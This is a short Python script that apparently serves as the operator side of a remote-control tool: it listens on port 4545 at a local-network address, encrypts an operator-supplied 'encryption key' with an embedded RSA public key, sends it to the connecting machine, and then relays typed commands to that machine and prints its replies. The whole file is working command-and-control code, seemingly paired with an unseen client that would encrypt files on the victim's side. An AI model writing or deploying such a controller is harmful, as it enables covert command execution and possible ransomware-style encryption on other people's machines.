import socket
import threading
from Cryptodome.PublicKey import RSA 
from Cryptodome.Cipher import PKCS1_OAEP

def recvf(c):
	while True:
		data = c.recv(2048)
		if len(data) !=0:
			print(data.decode('ascii'))

def server():
# to ecnrypt encryption key
	pk = """-----BEGIN PUBLIC KEY-----
	MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuDXmLnn23eM+AESxPu+b
	Fc9mNhn1j7H+sU5M6Fl0izFJv7DsuhrEbP7pGFAyIEw3ZDmDxK1N1SVX6STSTT16
	K93LjmbxajxU7FYBrZHGkCxNJdINpJvtioYf9FZ+xPIVfo3mndcH9JpuPa1+/U48
	l4O04Hjf9mKwX52f+ovtT4DIbvc8gKLPoGe2fqMzxmhZfWWPvTFjaZizS5UF3TOW
	2c8vYx2DO96wJ1Laj+E18N/fHKvfz3n5aYYWNMKuruDyZclezXcYPexDQZGjFBhO
	v0UEpeZlfgkmwTIlgJ0wrg60glGOmyzJ1dKO65O89sDTxnG269/6pFkDZ9UFMZEa
	uQIDAQAB
	-----END PUBLIC KEY-----"""
	pk = pk.encode('ascii')
	pubkey = RSA.importKey(pk)
	c= PKCS1_OAEP.new(pubkey)
	key_v = input("Enter The Encryption Key:")
	encrypted_key = c.encrypt(key_v.encode('ascii'))

	port = 4545
	ip = "192.168.1.7"
	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.setblocking(1)
		s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		s.bind((ip,port))
		s.listen(1)
		c , add = s.accept()
		print("connection from {0}:{1}".format(add[0],add[1]))
		c.send(encrypted_key)
		t = threading.Thread(target=recvf,args=(c,))
		t.start()
		while True:
			command = input("command >> ")
			c.send(command.encode('ascii'))
	except socket.error as e:
		print(e)
		s.close()

server()